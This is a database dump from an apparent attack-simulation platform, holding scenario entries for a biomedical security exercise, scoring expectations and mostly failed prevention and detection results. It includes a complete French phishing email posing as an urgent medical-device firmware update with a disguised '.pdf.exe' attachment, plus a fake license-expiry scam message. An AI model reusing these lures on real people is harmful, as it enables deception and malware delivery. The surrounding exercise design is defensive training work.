36daa8c0-d058-4347-badf-2822a38dd8b1	89206193-dbfb-4513-a186-d72c037dda4c	Test - Scan for Databases		{"expectations":[{"expectation_type":"PREVENTION","expectation_name":"Prevention","expectation_description":null,"expectation_score":100,"expectation_expectation_group":false,"expectation_expiration_time":21600},{"expectation_type":"DETECTION","expectation_name":"Detection","expectation_description":null,"expectation_score":100,"expectation_expectation_group":false,"expectation_expiration_time":21600}],"obfuscator":"plain-text"}	f	t	644	\N	377d029e-ce0e-404a-851b-03988fbb3fe2	2026-01-09 15:29:28.3197+00	2026-01-09 15:41:28.542054+00	\N	\N	0a4a063a-b40b-4991-9ab4-99db8ddaeeb9	\N	\N	\N	\N	COLLECTING
c58cdfeb-05e0-4160-8426-0ee508c331ba	89206193-dbfb-4513-a186-d72c037dda4c	Test - Clean Up Desktop		{"expectations":[{"expectation_type":"PREVENTION","expectation_name":"Prevention","expectation_description":null,"expectation_score":100,"expectation_expectation_group":false,"expectation_expiration_time":21600},{"expectation_type":"DETECTION","expectation_name":"Detection","expectation_description":null,"expectation_score":100,"expectation_expectation_group":false,"expectation_expiration_time":21600}],"obfuscator":"plain-text"}	f	t	1379	\N	377d029e-ce0e-404a-851b-03988fbb3fe2	2026-01-09 15:29:28.310662+00	2026-01-09 15:53:44.328797+00	\N	\N	9beb3641-606e-46b8-8168-8e9a906f8a3e	\N	\N	\N	\N	COLLECTING
5c755bbd-f265-4ece-a248-475287de4b9b	89206193-dbfb-4513-a186-d72c037dda4c	Email Phishing - Firmware Update Malveillant 	Email phishing envoyé au technicien biomédical avec attachment  "Firmware_Update_v2.3.pdf.exe". Simule initial access par spearphishing	{"expectations":[{"expectation_type":"MANUAL","expectation_name":"Détection rapide si infection","expectation_description":"SI détecte infection EDR en moins de 10 minutes","expectation_score":30,"expectation_expectation_group":false,"expiration_time_days":1,"expiration_time_hours":0,"expiration_time_minutes":0,"expectation_expiration_time":86400},{"expectation_type":"MANUAL","expectation_name":"Signalement email suspect","expectation_description":"Technicien doit signaler l'email au SI sans l'ouvrir","expectation_score":50,"expectation_expectation_group":true,"expiration_time_days":1,"expiration_time_hours":0,"expiration_time_minutes":0,"expectation_expiration_time":86400},{"expectation_type":"MANUAL","expectation_name":"Isolation poste compromis","expectation_description":"SI isole le poste infecté rapidement","expectation_score":20,"expectation_expectation_group":false,"expiration_time_days":1,"expiration_time_hours":0,"expiration_time_minutes":0,"expectation_expiration_time":86400}],"subject":"[URGENT] Mise à jour firmware critique - Action requise","body":"<p>Bonjour, Une mise à jour firmware critique est disponible pour vos équipements médicaux connectés. Cette mise à jour corrige une vulnérabilité de sécurité majeure identifiée sur les modèles suivants :&nbsp;</p><p>- Incubateurs BioMed série 2000</p><p>&nbsp;- Centrifugeuses MedLab Pro</p><p>&nbsp;- Analyseurs AutoChem X500&nbsp;</p><p>⚠️ Installation OBLIGATOIRE avant 18h00 aujourd'hui pour maintenir la conformité CE. Veuillez télécharger et installer le package ci-joint immédiatement.&nbsp;</p><p>Pour toute question, contactez notre support technique. Cordialement,&nbsp;</p><p>Équipe Support Technique&nbsp;</p><p>MedEquip International&nbsp;</p><p>support@medequip-updates.ru</p>","encrypted":false}	f	t	0	\N	\N	2026-01-16 09:58:57.236088+00	2026-01-16 09:58:57.236096+00	\N	\N	138ad8f8-32f8-4a22-8114-aaa12322bd09	\N	\N	3a848ec9-20ee-47eb-b09c-34c59bc55b4b	\N	COLLECTING
5f5326d3-d9bb-4618-8d73-1ee582e96623	89206193-dbfb-4513-a186-d72c037dda4c	Test - Defense Evasion		{"expectations":[{"expectation_type":"PREVENTION","expectation_name":"Prevention","expectation_description":null,"expectation_score":100,"expectation_expectation_group":false,"expectation_expiration_time":21600},{"expectation_type":"DETECTION","expectation_name":"Detection","expectation_description":null,"expectation_score":100,"expectation_expectation_group":false,"expectation_expiration_time":21600}],"obfuscator":"plain-text"}	f	t	0	\N	\N	2026-01-16 08:17:36.267496+00	2026-01-16 08:18:12.512067+00	\N	\N	edc597de-2394-4cde-8d5a-34598d73e057	\N	\N	\N	\N	COLLECTING
41ce0c39-b9f4-41c7-b899-bd0f356800f2	89206193-dbfb-4513-a186-d72c037dda4c	Test - Social Engineer		{"expectations":[{"expectation_type":"PREVENTION","expectation_name":"Prevention","expectation_description":null,"expectation_score":100,"expectation_expectation_group":false,"expectation_expiration_time":21600},{"expectation_type":"DETECTION","expectation_name":"Detection","expectation_description":null,"expectation_score":100,"expectation_expectation_group":false,"expectation_expiration_time":21600}],"obfuscator":"plain-text","message":"Your Windows License has expired. Please contact IT Support immediately"}	f	t	0	\N	\N	2026-01-16 08:44:20.301707+00	2026-01-16 08:52:09.612514+00	\N	\N	b576c19a-3832-4294-9cb4-4da6565cc20c	\N	\N	\N	\N	COLLECTING
515220ba-9cf0-435b-9c89-03ae2dee65bd	89206193-dbfb-4513-a186-d72c037dda4c	IDS Alert - Port Scan Réseau IT vers OT 	Alerte IDS détectant un port scan depuis  (poste technicien compromis) vers le réseau OT. \nScan ciblant SCADA server et PLCs.	{"expectations":[{"expectation_type":"MANUAL","expectation_name":"Corrélation avec inject ","expectation_description":" Admin réseau corrèle scan avec poste compromis étape 1","expectation_score":40,"expectation_expectation_group":false,"expiration_time_days":1,"expiration_time_hours":0,"expiration_time_minutes":0,"expectation_expiration_time":86400},{"expectation_type":"MANUAL","expectation_name":"Décision rapide","expectation_description":"Décision bloquer/surveiller en moins de 5 minutes","expectation_score":30,"expectation_expectation_group":false,"expiration_time_days":1,"expiration_time_hours":0,"expiration_time_minutes":0,"expectation_expiration_time":86400},{"expectation_type":"MANUAL","expectation_name":"Escalation RSSI","expectation_description":"Escalade vers RSSI pour décision shutdown OT","expectation_score":30,"expectation_expectation_group":false,"expiration_time_days":1,"expiration_time_hours":0,"expiration_time_minutes":0,"expectation_expiration_time":86400}],"subject":"[IDS ALERT] Port Scan Activity Detected - IT → OT Network","body":"<p>ALERTE IDS - PRIORITÉ ÉLEVÉE</p><p><br>DÉTECTION: Port Scan Activity<br>SÉVÉRITÉ: High<br>TIME: [TIMESTAMP]<br>&nbsp;</p><p>SOURCE INFORMATION:<br>- IP Source: 192.168.10.45<br>- Hostname: WORKSTATION-TECH02<br>- User: tech_biomedical</p><p>TARGET INFORMATION:<br>- Network: 192.168.20.0/24 (OT Segment)<br>- Ports scanned: 102, 502, 20000, 44818<br>&nbsp;└─ Siemens S7 (102)<br>&nbsp;└─ Modbus TCP (502)<br>&nbsp;└─ DNP3 (20000)<br>&nbsp;└─ Ethernet/IP (44818)</p><p>SCAN DETAILS:<br>- Total ports: 65,535<br>- Duration: 47 seconds<br>- Type: SYN Stealth Scan<br>- Tool signature: Nmap 7.94</p><p>TARGETED DEVICES DETECTED:<br>- scada-server.lab.local (192.168.20.10)<br>- plc-automate-01.lab.local (192.168.20.21)<br>- plc-incubateur-02.lab.local (192.168.20.22)</p><p>⚠️ ATTENTION: Scan provenant du réseau IT vers OT<br>⚠️ Aucune maintenance planifiée aujourd'hui</p><p><br>ACTION REQUISE:<br>1. Vérifier si scan légitime (maintenance?)<br>2. Corréler avec incident phishing Étape 1<br>3. Décider: Bloquer source OU Surveiller<br>&nbsp;</p><p>IDS System: Suricata v7.0.2<br>Rule: ET SCAN Potential ICS Port Scan</p>","encrypted":false}	f	t	900	\N	\N	2026-01-16 10:09:21.818096+00	2026-01-16 10:09:21.818103+00	\N	\N	138ad8f8-32f8-4a22-8114-aaa12322bd09	\N	\N	3a848ec9-20ee-47eb-b09c-34c59bc55b4b	\N	COLLECTING
\.


--
-- Data for Name: injects_asset_groups; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.injects_asset_groups (inject_id, asset_group_id) FROM stdin;
02954a34-0268-477f-9779-f98282ee9106	b672bfa8-ccc5-46e8-9a0e-2744e1c10c75
1c7953e3-46aa-4748-9370-7a0e2239c666	b672bfa8-ccc5-46e8-9a0e-2744e1c10c75
cca5290f-7324-41ab-b891-ed747996eac9	b672bfa8-ccc5-46e8-9a0e-2744e1c10c75
f7ca1396-02fe-489e-b14b-23dfad896154	b672bfa8-ccc5-46e8-9a0e-2744e1c10c75
e5074fad-0d61-469c-af79-d269e87ae7b8	b672bfa8-ccc5-46e8-9a0e-2744e1c10c75
a5d9f328-e2fe-4e7b-a1ed-d9df3e82ede9	b672bfa8-ccc5-46e8-9a0e-2744e1c10c75
3d6b39cc-941e-4206-a8dc-d74d00193e19	b672bfa8-ccc5-46e8-9a0e-2744e1c10c75
d62f4a25-62c9-418f-b029-dedfcebad7a6	b672bfa8-ccc5-46e8-9a0e-2744e1c10c75
ffa4da5c-aab3-4785-8aa2-7873d9b158b2	b672bfa8-ccc5-46e8-9a0e-2744e1c10c75
ff1643e4-e8f8-4c40-bf3e-0d819c02be92	b672bfa8-ccc5-46e8-9a0e-2744e1c10c75
a870742e-000e-4eec-9ef7-526b8a68cdd1	b672bfa8-ccc5-46e8-9a0e-2744e1c10c75
2171ccb6-84db-4ca5-bbcf-9e4735f9f9aa	b672bfa8-ccc5-46e8-9a0e-2744e1c10c75
73eac52e-6a09-4722-91a8-921c150c2557	b672bfa8-ccc5-46e8-9a0e-2744e1c10c75
1856b7ed-a5ea-4b16-a121-82f4891623d9	b672bfa8-ccc5-46e8-9a0e-2744e1c10c75
9557f435-721d-4dc0-9c65-af5b94a8deb9	b672bfa8-ccc5-46e8-9a0e-2744e1c10c75
f7b3e824-6578-44bf-915b-4dba8cd1fad1	b672bfa8-ccc5-46e8-9a0e-2744e1c10c75
761d24c8-908b-48b6-a962-5ffdeadce9bc	b672bfa8-ccc5-46e8-9a0e-2744e1c10c75
560916d1-a33b-4b9e-bc7d-af71584818c1	b672bfa8-ccc5-46e8-9a0e-2744e1c10c75
a91ac99b-7434-42dd-a00c-95f05300aa10	b672bfa8-ccc5-46e8-9a0e-2744e1c10c75
7ad5ab25-d274-4afe-a4ce-d182459ea5af	b672bfa8-ccc5-46e8-9a0e-2744e1c10c75
7ffd85f3-c962-4aed-9b1c-d39c4feedeb2	b672bfa8-ccc5-46e8-9a0e-2744e1c10c75
b74fecbf-ec88-4c8c-a842-a5f71f4a1f27	b672bfa8-ccc5-46e8-9a0e-2744e1c10c75
5c493a6e-e47a-48fc-9899-cb28c2348c15	b672bfa8-ccc5-46e8-9a0e-2744e1c10c75
\.


--
-- Data for Name: injects_assets; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.injects_assets (inject_id, asset_id) FROM stdin;
2d3f779a-9f48-4a2b-897b-d2ffeddafbeb	4ad149ae-1070-499a-84bc-fa55a3b9c8e2
13833420-5550-4dc9-8a7e-f42befc5b011	4ad149ae-1070-499a-84bc-fa55a3b9c8e2
3689ab59-2542-4f0b-b491-70eb00062b3b	4ad149ae-1070-499a-84bc-fa55a3b9c8e2
0cc59d8d-b0d7-428e-bdca-1b371e0a3be4	ae65e95f-1db6-4423-a763-1759132f960c
0ff9aea1-f772-4314-85ec-2792c114d90b	ae65e95f-1db6-4423-a763-1759132f960c
eeee5cd4-78af-4a10-96aa-0a7276d87e02	4ad149ae-1070-499a-84bc-fa55a3b9c8e2
10b4496c-08e3-49fa-916e-83687b041798	4ad149ae-1070-499a-84bc-fa55a3b9c8e2
0741f4b0-a552-4e11-a814-9b07a5b5a807	4ad149ae-1070-499a-84bc-fa55a3b9c8e2
bbcc074e-8500-4862-9ef0-92c0eae2f804	4ad149ae-1070-499a-84bc-fa55a3b9c8e2
e7bcbe49-178b-4f8a-a73e-6c734e2032b7	ae65e95f-1db6-4423-a763-1759132f960c
5e2a54ac-74d9-4191-8a2e-aeb7e480c742	4ad149ae-1070-499a-84bc-fa55a3b9c8e2
27782be0-6497-48f6-9052-ca59d1a56205	ae65e95f-1db6-4423-a763-1759132f960c
56984800-c07d-4aed-814a-11a19c816b26	4ad149ae-1070-499a-84bc-fa55a3b9c8e2
2343768a-1a7b-41bf-920b-ce4efd6cb99d	4ad149ae-1070-499a-84bc-fa55a3b9c8e2
e123988d-c196-494a-bdf7-b367b76ef878	4ad149ae-1070-499a-84bc-fa55a3b9c8e2
635fc963-f7b3-4468-ab3f-ad6271b2a22d	4ad149ae-1070-499a-84bc-fa55a3b9c8e2
dad12758-dbee-4646-aca3-bacaa332485c	4ad149ae-1070-499a-84bc-fa55a3b9c8e2
c58cdfeb-05e0-4160-8426-0ee508c331ba	4ad149ae-1070-499a-84bc-fa55a3b9c8e2
36daa8c0-d058-4347-badf-2822a38dd8b1	ae65e95f-1db6-4423-a763-1759132f960c
0d9e412f-7003-4545-a65f-26184b48b173	4ad149ae-1070-499a-84bc-fa55a3b9c8e2
88fb9ac5-0396-4b3e-be00-648b20ec7758	ae65e95f-1db6-4423-a763-1759132f960c
321867c2-adb6-46db-8d13-602ca4bc0c7a	ae65e95f-1db6-4423-a763-1759132f960c
5f5326d3-d9bb-4618-8d73-1ee582e96623	ae65e95f-1db6-4423-a763-1759132f960c
41ce0c39-b9f4-41c7-b899-bd0f356800f2	4ad149ae-1070-499a-84bc-fa55a3b9c8e2
\.


--
-- Data for Name: injects_dependencies; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.injects_dependencies (inject_parent_id, inject_children_id, dependency_condition, dependency_created_at, dependency_updated_at) FROM stdin;
1c7953e3-46aa-4748-9370-7a0e2239c666	3d6b39cc-941e-4206-a8dc-d74d00193e19	{"mode": "and", "conditions": [{"key": "Execution", "value": true, "operator": "eq"}]}	2026-01-09 14:19:25.217259+00	2026-01-09 14:19:25.217277+00
3d6b39cc-941e-4206-a8dc-d74d00193e19	d62f4a25-62c9-418f-b029-dedfcebad7a6	{"mode": "and", "conditions": [{"key": "Execution", "value": true, "operator": "eq"}]}	2026-01-09 14:19:25.532665+00	2026-01-09 14:19:25.532685+00
d62f4a25-62c9-418f-b029-dedfcebad7a6	ffa4da5c-aab3-4785-8aa2-7873d9b158b2	{"mode": "and", "conditions": [{"key": "Execution", "value": true, "operator": "eq"}]}	2026-01-09 14:19:25.820159+00	2026-01-09 14:19:25.820179+00
ffa4da5c-aab3-4785-8aa2-7873d9b158b2	ff1643e4-e8f8-4c40-bf3e-0d819c02be92	{"mode": "and", "conditions": [{"key": "Execution", "value": true, "operator": "eq"}]}	2026-01-09 14:19:26.065369+00	2026-01-09 14:19:26.065389+00
ff1643e4-e8f8-4c40-bf3e-0d819c02be92	a870742e-000e-4eec-9ef7-526b8a68cdd1	{"mode": "and", "conditions": [{"key": "Execution", "value": true, "operator": "eq"}]}	2026-01-09 14:19:26.279519+00	2026-01-09 14:19:26.279536+00
a870742e-000e-4eec-9ef7-526b8a68cdd1	2171ccb6-84db-4ca5-bbcf-9e4735f9f9aa	{"mode": "and", "conditions": [{"key": "Execution", "value": true, "operator": "eq"}]}	2026-01-09 14:19:26.455345+00	2026-01-09 14:19:26.455372+00
2171ccb6-84db-4ca5-bbcf-9e4735f9f9aa	73eac52e-6a09-4722-91a8-921c150c2557	{"mode": "and", "conditions": [{"key": "Execution", "value": true, "operator": "eq"}]}	2026-01-09 14:19:26.605384+00	2026-01-09 14:19:26.605402+00
73eac52e-6a09-4722-91a8-921c150c2557	1856b7ed-a5ea-4b16-a121-82f4891623d9	{"mode": "and", "conditions": [{"key": "Execution", "value": true, "operator": "eq"}]}	2026-01-09 14:19:26.751858+00	2026-01-09 14:19:26.751884+00
1856b7ed-a5ea-4b16-a121-82f4891623d9	9557f435-721d-4dc0-9c65-af5b94a8deb9	{"mode": "and", "conditions": [{"key": "Execution", "value": true, "operator": "eq"}]}	2026-01-09 14:19:26.884596+00	2026-01-09 14:19:26.884619+00
9557f435-721d-4dc0-9c65-af5b94a8deb9	f7b3e824-6578-44bf-915b-4dba8cd1fad1	{"mode": "and", "conditions": [{"key": "Execution", "value": true, "operator": "eq"}]}	2026-01-09 14:19:27.084046+00	2026-01-09 14:19:27.08407+00
f7b3e824-6578-44bf-915b-4dba8cd1fad1	761d24c8-908b-48b6-a962-5ffdeadce9bc	{"mode": "and", "conditions": [{"key": "Execution", "value": true, "operator": "eq"}]}	2026-01-09 14:19:27.215282+00	2026-01-09 14:19:27.215333+00
761d24c8-908b-48b6-a962-5ffdeadce9bc	560916d1-a33b-4b9e-bc7d-af71584818c1	{"mode": "and", "conditions": [{"key": "Execution", "value": true, "operator": "eq"}]}	2026-01-09 14:19:27.487622+00	2026-01-09 14:19:27.487644+00
9c94b967-f81b-4235-ad9c-3d24f7447fd0	b271eece-2a3d-4fa1-9e5e-60a7eb7aceaf	{"mode": "and", "conditions": [{"key": "Execution", "value": true, "operator": "eq"}]}	2026-01-09 14:19:31.755856+00	2026-01-09 14:19:31.755877+00
2d3f779a-9f48-4a2b-897b-d2ffeddafbeb	13833420-5550-4dc9-8a7e-f42befc5b011	{"mode": "and", "conditions": [{"key": "Execution", "value": true, "operator": "eq"}]}	2026-01-09 15:16:52.74306+00	2026-01-09 15:16:52.743108+00
13833420-5550-4dc9-8a7e-f42befc5b011	3689ab59-2542-4f0b-b491-70eb00062b3b	{"mode": "and", "conditions": [{"key": "Execution", "value": true, "operator": "eq"}]}	2026-01-09 15:17:37.563423+00	2026-01-09 15:17:37.563494+00
0ff9aea1-f772-4314-85ec-2792c114d90b	e7bcbe49-178b-4f8a-a73e-6c734e2032b7	{"mode": "and", "conditions": [{"key": "Execution", "value": true, "operator": "eq"}]}	2026-01-09 15:18:36.860095+00	2026-01-09 15:18:36.860156+00
3689ab59-2542-4f0b-b491-70eb00062b3b	0cc59d8d-b0d7-428e-bdca-1b371e0a3be4	{"mode": "and", "conditions": [{"key": "Execution", "value": true, "operator": "eq"}]}	2026-01-09 15:20:03.877228+00	2026-01-09 15:20:03.877297+00
0cc59d8d-b0d7-428e-bdca-1b371e0a3be4	0ff9aea1-f772-4314-85ec-2792c114d90b	{"mode": "and", "conditions": [{"key": "Execution", "value": true, "operator": "eq"}]}	2026-01-09 15:20:30.155571+00	2026-01-09 15:20:30.155591+00
0741f4b0-a552-4e11-a814-9b07a5b5a807	bbcc074e-8500-4862-9ef0-92c0eae2f804	{"mode": "and", "conditions": [{"key": "Execution", "value": true, "operator": "eq"}]}	2026-01-09 15:21:02.484415+00	2026-01-09 15:21:02.484426+00
dad12758-dbee-4646-aca3-bacaa332485c	27782be0-6497-48f6-9052-ca59d1a56205	{"mode": "and", "conditions": [{"key": "Execution", "value": true, "operator": "eq"}]}	2026-01-09 15:29:28.34043+00	2026-01-09 15:29:28.340442+00
0d9e412f-7003-4545-a65f-26184b48b173	2343768a-1a7b-41bf-920b-ce4efd6cb99d	{"mode": "and", "conditions": [{"key": "Execution", "value": true, "operator": "eq"}]}	2026-01-09 15:29:28.344194+00	2026-01-09 15:29:28.344212+00
56984800-c07d-4aed-814a-11a19c816b26	635fc963-f7b3-4468-ab3f-ad6271b2a22d	{"mode": "and", "conditions": [{"key": "Execution", "value": true, "operator": "eq"}]}	2026-01-09 15:29:28.346414+00	2026-01-09 15:29:28.346427+00
635fc963-f7b3-4468-ab3f-ad6271b2a22d	dad12758-dbee-4646-aca3-bacaa332485c	{"mode": "and", "conditions": [{"key": "Execution", "value": true, "operator": "eq"}]}	2026-01-09 15:29:28.348347+00	2026-01-09 15:29:28.348393+00
88fb9ac5-0396-4b3e-be00-648b20ec7758	36daa8c0-d058-4347-badf-2822a38dd8b1	{"mode": "and", "conditions": [{"key": "Execution", "value": true, "operator": "eq"}]}	2026-01-09 15:29:28.350238+00	2026-01-09 15:29:28.350251+00
27782be0-6497-48f6-9052-ca59d1a56205	88fb9ac5-0396-4b3e-be00-648b20ec7758	{"mode": "and", "conditions": [{"key": "Execution", "value": true, "operator": "eq"}]}	2026-01-09 15:29:28.352406+00	2026-01-09 15:29:28.352417+00
\.


--
-- Data for Name: injects_documents; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.injects_documents (inject_id, document_id, document_attached) FROM stdin;
5c755bbd-f265-4ece-a248-475287de4b9b	435cc834-6596-4d2c-b240-dc78f5fdb069	t
5c755bbd-f265-4ece-a248-475287de4b9b	71c1342f-c1c2-4adf-bdd5-30c160b86759	t
5c755bbd-f265-4ece-a248-475287de4b9b	b09e4d2f-74e4-4d02-add7-7b65b078cce1	t
5c755bbd-f265-4ece-a248-475287de4b9b	c78ed2d1-dde5-41d9-947e-c2e85e05beee	t
\.


--
-- Data for Name: injects_expectations; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.injects_expectations (inject_expectation_id, inject_expectation_created_at, inject_expectation_updated_at, user_id, exercise_id, inject_id, team_id, inject_expectation_type, inject_expectation_score, article_id, challenge_id, inject_expectation_expected_score, inject_expectation_name, inject_expectation_description, inject_expectation_group, asset_id, asset_group_id, inject_expectation_results, inject_expectation_signatures, inject_expiration_time, agent_id) FROM stdin;
40eae64a-cf62-45d3-9486-aa8e66611f79	2026-01-09 15:33:04.070743+00	2026-01-09 21:33:19.428884+00	\N	377d029e-ce0e-404a-851b-03988fbb3fe2	dad12758-dbee-4646-aca3-bacaa332485c	\N	PREVENTION	0	\N	\N	100	Prevention	\N	f	4ad149ae-1070-499a-84bc-fa55a3b9c8e2	\N	[{"sourceId":"96e476e0-b9c4-4660-869c-98585adf754d","sourceType":"collector","sourceName":"Expectations Expiration Manager","date":"2026-01-09T21:33:19.182183740Z","score":0.0,"result":"Not Prevented","metadata":null}]	\N	21600	\N
dae70af0-47c9-4983-bb22-572646aadaee	2026-01-09 15:32:04.298414+00	2026-01-09 21:32:19.416238+00	\N	377d029e-ce0e-404a-851b-03988fbb3fe2	635fc963-f7b3-4468-ab3f-ad6271b2a22d	\N	PREVENTION	0	\N	\N	100	Prevention	\N	f	4ad149ae-1070-499a-84bc-fa55a3b9c8e2	\N	[{"sourceId":"96e476e0-b9c4-4660-869c-98585adf754d","sourceType":"collector","sourceName":"Expectations Expiration Manager","date":"2026-01-09T21:32:19.186822356Z","score":0.0,"result":"Not Prevented","metadata":null}]	\N	21600	\N
c79ffdd3-3749-49c4-b467-62507e8ba084	2026-01-09 15:32:04.312007+00	2026-01-09 21:32:19.419297+00	\N	377d029e-ce0e-404a-851b-03988fbb3fe2	635fc963-f7b3-4468-ab3f-ad6271b2a22d	\N	PREVENTION	0	\N	\N	100	Prevention	\N	f	4ad149ae-1070-499a-84bc-fa55a3b9c8e2	\N	[{"sourceId":"96e476e0-b9c4-4660-869c-98585adf754d","sourceType":"collector","sourceName":"Expectations Expiration Manager","date":"2026-01-09T21:32:19.186822356Z","score":0.0,"result":"Not Prevented","metadata":null}]	[{"type":"parent_process_name","value":"oaev-implant-635fc963-f7b3-4468-ab3f-ad6271b2a22d-agent-78d3b1f9-ac24-4d89-8b5d-5a291ecee2eb"},{"type":"start_date","value":"2026-01-09T15:32:31.099985721Z"},{"type":"end_date","value":"2026-01-09T15:32:32.191986Z"}]	21600	78d3b1f9-ac24-4d89-8b5d-5a291ecee2eb
8c73b7ae-e526-46c4-9e00-f8bfe8176294	2026-01-09 15:35:03.964777+00	2026-01-09 21:35:19.369884+00	\N	377d029e-ce0e-404a-851b-03988fbb3fe2	0d9e412f-7003-4545-a65f-26184b48b173	\N	PREVENTION	0	\N	\N	100	Prevention	\N	f	4ad149ae-1070-499a-84bc-fa55a3b9c8e2	\N	[{"sourceId":"96e476e0-b9c4-4660-869c-98585adf754d","sourceType":"collector","sourceName":"Expectations Expiration Manager","date":"2026-01-09T21:35:19.173421309Z","score":0.0,"result":"Not Prevented","metadata":null}]	\N	21600	\N
c8bceadb-2f9a-4b3f-b4b9-319d97b809a4	2026-01-09 15:33:04.073241+00	2026-01-09 21:33:19.431379+00	\N	377d029e-ce0e-404a-851b-03988fbb3fe2	dad12758-dbee-4646-aca3-bacaa332485c	\N	PREVENTION	0	\N	\N	100	Prevention	\N	f	4ad149ae-1070-499a-84bc-fa55a3b9c8e2	\N	[{"sourceId":"96e476e0-b9c4-4660-869c-98585adf754d","sourceType":"collector","sourceName":"Expectations Expiration Manager","date":"2026-01-09T21:33:19.182183740Z","score":0.0,"result":"Not Prevented","metadata":null}]	[{"type":"parent_process_name","value":"oaev-implant-dad12758-dbee-4646-aca3-bacaa332485c-agent-78d3b1f9-ac24-4d89-8b5d-5a291ecee2eb"},{"type":"start_date","value":"2026-01-09T15:33:31.869422839Z"},{"type":"end_date","value":"2026-01-09T15:34:12.404423Z"}]	21600	78d3b1f9-ac24-4d89-8b5d-5a291ecee2eb
5a0f42a9-174a-4f22-8079-e478d5042d68	2026-01-09 15:35:04.060989+00	2026-01-09 21:35:19.424123+00	\N	377d029e-ce0e-404a-851b-03988fbb3fe2	0d9e412f-7003-4545-a65f-26184b48b173	\N	DETECTION	0	\N	\N	100	Detection	\N	f	4ad149ae-1070-499a-84bc-fa55a3b9c8e2	\N	[{"sourceId":"96e476e0-b9c4-4660-869c-98585adf754d","sourceType":"collector","sourceName":"Expectations Expiration Manager","date":"2026-01-09T21:35:19.276861185Z","score":0.0,"result":"Not Detected","metadata":null}]	\N	21600	\N
72e84067-12cd-4154-8317-c131c5ae8325	2026-01-09 15:30:03.994032+00	2026-01-09 21:30:19.487261+00	\N	377d029e-ce0e-404a-851b-03988fbb3fe2	56984800-c07d-4aed-814a-11a19c816b26	\N	PREVENTION	0	\N	\N	100	Prevention	\N	f	4ad149ae-1070-499a-84bc-fa55a3b9c8e2	\N	[{"sourceId":"96e476e0-b9c4-4660-869c-98585adf754d","sourceType":"collector","sourceName":"Expectations Expiration Manager","date":"2026-01-09T21:30:19.235029665Z","score":0.0,"result":"Not Prevented","metadata":null}]	\N	21600	\N
3a55641f-8caf-4bde-85a4-c34a872d34ae	2026-01-09 15:32:04.317219+00	2026-01-09 21:32:19.421038+00	\N	377d029e-ce0e-404a-851b-03988fbb3fe2	635fc963-f7b3-4468-ab3f-ad6271b2a22d	\N	DETECTION	0	\N	\N	100	Detection	\N	f	4ad149ae-1070-499a-84bc-fa55a3b9c8e2	\N	[{"sourceId":"96e476e0-b9c4-4660-869c-98585adf754d","sourceType":"collector","sourceName":"Expectations Expiration Manager","date":"2026-01-09T21:32:19.405177798Z","score":0.0,"result":"Not Detected","metadata":null}]	\N	21600	\N
7e1ced12-e4bb-4a71-975f-3739b7699f11	2026-01-09 15:33:04.075083+00	2026-01-09 21:33:19.432721+00	\N	377d029e-ce0e-404a-851b-03988fbb3fe2	dad12758-dbee-4646-aca3-bacaa332485c	\N	DETECTION	0	\N	\N	100	Detection	\N	f	4ad149ae-1070-499a-84bc-fa55a3b9c8e2	\N	[{"sourceId":"96e476e0-b9c4-4660-869c-98585adf754d","sourceType":"collector","sourceName":"Expectations Expiration Manager","date":"2026-01-09T21:33:19.393505040Z","score":0.0,"result":"Not Detected","metadata":null}]	\N	21600	\N
803516e0-ac45-40c2-b016-3eedc3e0ca47	2026-01-09 15:35:04.55968+00	2026-01-09 21:35:19.448292+00	\N	377d029e-ce0e-404a-851b-03988fbb3fe2	5e2a54ac-74d9-4191-8a2e-aeb7e480c742	\N	PREVENTION	0	\N	\N	100	Prevention	\N	f	4ad149ae-1070-499a-84bc-fa55a3b9c8e2	\N	[{"sourceId":"96e476e0-b9c4-4660-869c-98585adf754d","sourceType":"collector","sourceName":"Expectations Expiration Manager","date":"2026-01-09T21:35:19.278047540Z","score":0.0,"result":"Not Prevented","metadata":null}]	\N	21600	\N
16ea5e47-0db1-4357-b8ef-9006a05a9406	2026-01-09 15:37:03.634183+00	2026-01-09 21:37:19.514927+00	\N	377d029e-ce0e-404a-851b-03988fbb3fe2	27782be0-6497-48f6-9052-ca59d1a56205	\N	PREVENTION	0	\N	\N	100	Prevention	\N	f	ae65e95f-1db6-4423-a763-1759132f960c	\N	[{"sourceId":"96e476e0-b9c4-4660-869c-98585adf754d","sourceType":"collector","sourceName":"Expectations Expiration Manager","date":"2026-01-09T21:37:19.189315187Z","score":0.0,"result":"Not Prevented","metadata":null}]	\N	21600	\N
fa5db3d6-77d0-42e6-8a4c-3a2f35a679d1	2026-01-09 15:37:03.643777+00	2026-01-09 21:37:19.518892+00	\N	377d029e-ce0e-404a-851b-03988fbb3fe2	27782be0-6497-48f6-9052-ca59d1a56205	\N	PREVENTION	0	\N	\N	100	Prevention	\N	f	ae65e95f-1db6-4423-a763-1759132f960c	\N	[{"sourceId":"96e476e0-b9c4-4660-869c-98585adf754d","sourceType":"collector","sourceName":"Expectations Expiration Manager","date":"2026-01-09T21:37:19.189315187Z","score":0.0,"result":"Not Prevented","metadata":null}]	[{"type":"parent_process_name","value":"oaev-implant-27782be0-6497-48f6-9052-ca59d1a56205-agent-19213a51-c939-4f40-9607-b93608da8f90"},{"type":"source_ipv6_address","value":"fe80::71d2:70e:b0a9:c611"},{"type":"source_ipv4_address","value":"10.0.0.44"},{"type":"source_ipv4_address","value":"10.0.0.44"},{"type":"start_date","value":"2026-01-09T15:37:43.079778677Z"},{"type":"end_date","value":"2026-01-09T15:37:44.972779Z"}]	21600	19213a51-c939-4f40-9607-b93608da8f90
